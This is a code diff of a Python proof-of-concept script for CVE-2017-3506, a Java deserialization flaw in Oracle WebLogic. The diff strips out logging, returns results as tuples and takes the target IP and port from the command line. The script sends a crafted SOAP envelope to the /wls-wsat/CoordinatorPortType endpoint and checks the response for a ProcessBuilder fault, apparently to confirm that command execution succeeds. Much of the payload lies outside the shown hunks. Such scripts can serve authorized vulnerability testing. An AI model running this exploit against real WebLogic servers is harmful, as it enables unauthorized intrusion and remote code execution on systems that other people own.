@@ -11,20 +11,14 @@
 import sys
 import requests
 import re
-import logging
 
-logging.basicConfig(filename='Weblogic.log',
-                    format='%(asctime)s %(message)s',
-                    filemode="w", level=logging.INFO)
 
 VUL=['CVE-2017-3506']
 headers = {'user-agent': 'ceshi/0.0.1'}
 
-def poc(url,index):
-    if not url.startswith("http"):
-        url = "http://" + url
-    if "/" in url:
-        url += '/wls-wsat/CoordinatorPortType'
+def poc(u):
+    url = "http://" + u
+    url += '/wls-wsat/CoordinatorPortType'
     post_str = '''
     <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
       <soapenv:Header>
@@ -59,20 +53,17 @@ def poc(url,index):
         response = ""
 
     if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
-        logging.info('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
-        print('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
+        return (1,'[+] [{}] weblogic has a JAVA deserialization vulnerability:{}'.format(u,VUL[0]))
     else:
-        logging.info('[-]Target weblogic not detected {}'.format(VUL[index]))
-        print('[-]Target weblogic not detected {}'.format(VUL[index]))
+        return (0,'[-] [{}] weblogic not detected {}'.format(u,VUL[0]))
 
 
-def run(rip,rport,index):
+
+def run(rip,rport):
     url=rip+':'+str(rport)
-    poc(url=url,index=index)
+    return poc(url)
 
 if __name__ == '__main__':
-    # dip = sys.argv[1]
-    # dport = int(sys.argv[2])
-    dip = '127.0.0.1'
-    dport = 7001
-    run(dip,dport,0)
+    dip = sys.argv[1]
+    dport = int(sys.argv[2])
+    run(dip,dport)
